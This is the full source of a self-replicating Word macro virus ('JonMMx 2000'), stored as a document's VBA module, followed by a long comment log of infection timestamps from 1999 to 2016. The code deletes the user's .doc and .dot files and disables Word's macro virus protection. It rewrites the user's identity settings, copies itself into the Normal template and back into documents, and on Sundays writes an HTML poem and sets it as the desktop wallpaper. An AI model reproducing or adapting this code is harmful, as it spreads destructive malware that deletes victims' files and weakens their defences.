Rem Attribute VBA_ModuleType=VBADocumentModule
Option VBASupport 1


'Seline, Where are you dear
Const Marker = "<- this is a marker! by jonhehehe TheBest-versi212x"
Private Sub Document_Open()
Document_Close
End Sub
Private Sub Document_Close()
Dim nmod As Object
Dim isd As String
Dim DS, NTS, DI, NTI As Boolean
Dim Jon, Users, LogData, LogFile As String
On Error Resume Next
AddIns.Unload True
Kill Options.DefaultFilePath(8) & "\*.doc"
Kill Options.DefaultFilePath(8) & "\*.dot"
Options.VirusProtection = False
Application.UserName = "JonMMx 2000"
Application.UserInitials = "MeMeX"
Application.UserAddress = "JonMMx2000@yahoo.com"
Application.EnableCancelKey = wdCancelDisabled
GoSub InsertIon
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", _
   "LogData in") = False) Then GoSub LoggingIn
If Weekday(Now()) = 1 Then GoSub ShowMe
GoTo Finish
InsertIon:
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
DI = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NTI = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)
If (DI Xor NTI) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
 If DI Then
   NTS = NormalTemplate.Saved
   Jon = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
   For i = 1 To Len(Application.UserAddress)
    If (Mid(Application.UserAddress, i, 1) <> Chr(13)) Then
       If (Mid(Application.UserAddress, i, 1) <> Chr(10)) Then
          Users = Users & Mid(Application.UserAddress, i, 1)
       End If
    Else
       Users = Users & Chr(13) & " '"
    End If
   Next
   Jon = Jon & Chr(13) & _
         "' " & Format(Time, "hh:mm:sc AMPM-") & _
                Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
         "' " & Application.UserName & Chr(13) & _
         "' " & Users & Chr(13) & Chr(13) & " "
   nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
   nt.CodeModule.AddFromString Jon
   If NTS Then NormalTemplate.Save
 End If
 If NTI Then
    DS = ActiveDocument.Saved
    Jon = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString Jon
    If DS Then ActiveDocument.Save
 End If
End If
Return
LoggingIn:
   System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogData in") = True
   GoSub ShowMe
Return
ShowMe:
Dim RootsyS As String
On Error Resume Next
 RootsyS = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "SystemRoot")
 Open RootsyS & "\Jon.html" For Output As #1
 Print #1, "<Html><head><title>Welcome to Destroyer of the last Manillenium JontheBEST</title></head><Body><body bgcolor = '#FFF212' >"
 Print #1, "<center><p align='center'><font color='#800000'size='25'><strong>a Poet For My Dear Love</strong></font></p>"
 Print #1, "<p align='center'><font color='#000000' size='6'><strong><a href='mailto:iamwaiting@yahoo.com'>Dear Iin</a></strong></font> </p>"
 Print #1, "<font normal></center>To the very best that happen in mylife<p>"
 Print #1, "<p>Long ago and in my mind, I can see your face lonely and lost in time "
 Print #1, "<p>You were gone since yester month But the memories, never would dissapear"
 Print #1, "<p>I think of you, I THINK OF YOU.<p>"
 Print #1, "<p>Yes it's true I can pretend. But the paint of blue, keep beat me till the end."
 Print #1, "<p>Yes it's hard to understand. Why you leaving me and all we dreaming on "
 Print #1, "<p>Dear Iin, I close my eyes and see your face.  That's all I have to do to be with you. "
 Print #1, "<p>Dear Iin, altough I can not touch your face.  I know what I can do to be with you "
 Print #1, "<p>Long ago so faraway. But the light of blue, still living with me today."
 Print #1, "<p>You were gone since yester month.  But the memories never would dissapear."
 Print #1, "<center><font color='#245505' size='6'><strong><p>Speed Hari</strong></font></center></Body></html>"
 Close #1
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Desktop\General", "Wallpaper") = RootsyS & "\Jon.html"
Return
Finish:
End Sub
'Logfile -->

' 06:14:2518:14:25 -Kamis, 22 Jul 1999
' JonMMx 2000
' jonthebest@hotbot.com


' 09:07:259:07:25 -Sabtu, 24 Jun 2017
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:13:3712:13:37 AM AM-Saturday, 14 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:55:459:55:45 AM AM-Wednesday, 25 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:03:2112:03:21 PM PM-Friday, 27 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:47:402:47:40 PM PM-Sunday, 29 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:37:562:37:56 AM AM-Monday, 30 Aug 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:29:4310:29:43 PM PM-Wednesday, 1 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:28:249:28:24 AM AM-Sunday, 5 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:17:912:17:09 PM PM-Monday, 13 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:48:159:48:15 AM AM-Sunday, 26 Sep 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:34:5808:34:58 -Wednesday, 6 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:09:535:09:53 PM PM-Monday, 18 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:55:3110:55:31 AM AM-Wednesday, 20 Oct 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:57:5211:57:52 AM AM-Saturday, 6 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:51:302:51:03 PM PM-Monday, 29 Nov 1999
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:24:1411:24:14 AM AM-Tuesday, 11 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:57:3103:57:31 PM PM-Thursday, 13 Jan 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:26:2203:26:22 下午 下午-Thursday, 17 Feb 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:55:178:55:17  AM-Tuesday, 21 Mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:15:509:15:50 AM-Thursday, 30 Mar 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:43:1910:43:19  AM-Monday, 22 May 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:36:388:36:38  AM-Wednesday, 31 May 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:33:210:33:02  AM-Saturday, 17 Jun 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:45:4612:45:46  PM-Wednesday, 26 Jul 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:12:4714:12:47 PM-Tuesday, 26 Sep 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:07:2715:07:27  PM-Tuesday, 14 Nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:04:3319:04:33  PM-Thursday, 16 Nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:29:1818:29:18  PM-Wednesday, 22 Nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:26:2310:26:23  AM-Saturday, 25 Nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 07:08:527:08:52  AM-Sunday, 26 Nov 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:15:508:15:50  AM-Friday, 22 Dec 2000
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:50:158:50:15  AM-Wednesday, 7 Feb 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:36:59:36:05  AM-Thursday, 8 Feb 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:35:3403:35:34 下午 下午-Saturday, 24 Feb 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:43:1212:43:12 下午 下午-Saturday, 17 Mar 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:40:5910:40:59 上午 上午-Wednesday, 18 Apr 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:51:5702:51:57 下午 下午-Friday, 20 Apr 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:30:5801:30:58 下午 下午-Tuesday, 22 May 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 12:18:5812:18:58 下午 下午-Saturday, 16 Jun 2001
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:16:722:16:07 下午-Sunday, 27 Feb 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:02:1515:02:15 下午-Wednesday, 9 Mar 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:54:2517:54:25 下午-Thursday, 17 Mar 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:37:1015:37:10 下午-Tuesday, 29 Mar 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:53:5917:53:59 下午-Thursday, 14 Apr 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:21:3214:21:32 下午-Friday, 13 May 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:49:529:49:52 上午-Tuesday, 28 Jun 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:48:158:48:15 上午-Friday, 15 Jul 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:20:148:20:14 上午-Thursday, 8 Sep 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:04:3811:04:38 上午-Sunday, 18 Sep 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:11:1317:11:13 下午-Thursday, 20 Oct 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:45:3817:45:38 下午-Saturday, 29 Oct 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:50:218:50:21 上午-Monday, 7 Nov 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:21:2318:21:23 下午-Friday, 18 Nov 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:06:409:06:40 上午-Saturday, 17 Dec 2011
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:29:239:29:23 上午-Saturday, 14 Jan 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:22:3215:22:32 下午-Sunday, 1 Apr 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 01:33:5913:33:59 下午-Tuesday, 5 Jun 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:14:3523:14:35 下午-Tuesday, 14 Aug 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:06:3310:06:33 上午-Monday, 27 Aug 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 06:11:4418:11:44 下午-Friday, 31 Aug 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:57:548:57:54 上午-Monday, 3 Sep 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 08:53:1708:53:17 上午-Tuesday, 4 Sep 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:55:214:55:02 下午-Tuesday, 4 Sep 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:34:2917:34:29 下午-Thursday, 13 Sep 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:06:1910:06:19 上午-Friday, 14 Sep 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:11:4511:11:45 上午-Friday, 14 Sep 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:13:4416:13:44 PM-Monday, 24 Sep 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:51:5210:51:52 AM-Tuesday, 23 Oct 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:34:1416:34:14 下午-Wednesday, 24 Oct 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:00:599:00:59 上午-Monday, 29 Oct 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:43:3111:43:31 上午-Tuesday, 6 Nov 2012
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:19:5817:19:58 下午-Saturday, 5 Jan 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:38:319:38:31 上午-Thursday, 21 Feb 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:26:515:26:05 PM-Friday, 1 Mar 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:43:1015:43:10 下午-Tuesday, 5 Mar 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:47:5810:47:58 上午-Friday, 29 Mar 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:18:1315:18:13 下午-Tuesday, 18 Jun 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 03:10:5715:10:57 下午-Tuesday, 2 Jul 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:41:017:41:00 下午-Friday, 5 Jul 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:10:4014:10:40 下午-Saturday, 27 Jul 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:12:2311:12:23 上午-Monday, 26 Aug 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 02:21:3014:21:30 下午-Monday, 23 Sep 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 11:48:4611:48:46 上午-Tuesday, 24 Sep 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 09:26:389:26:38 上午-Wednesday, 13 Nov 2013
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:16:5717:16:57 下午-Friday, 3 Jan 2014
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:01:3716:01:37 下午-Wednesday, 2 Apr 2014
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 04:07:016:07:00 下午-Wednesday, 13 Aug 2014
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:38:3017:38:30 下午-Sunday, 31 May 2015
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:49:2417:49:24 下午-Monday, 6 Jul 2015
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 05:45:5217:45:52 下午-Friday, 16 Oct 2015
' JonMMx 2000
' JonMMx2000@yahoo.com

 


' 10:07:4210:07:42 上午-Saturday, 2 Apr 2016
' JonMMx 2000
' JonMMx2000@yahoo.com

 



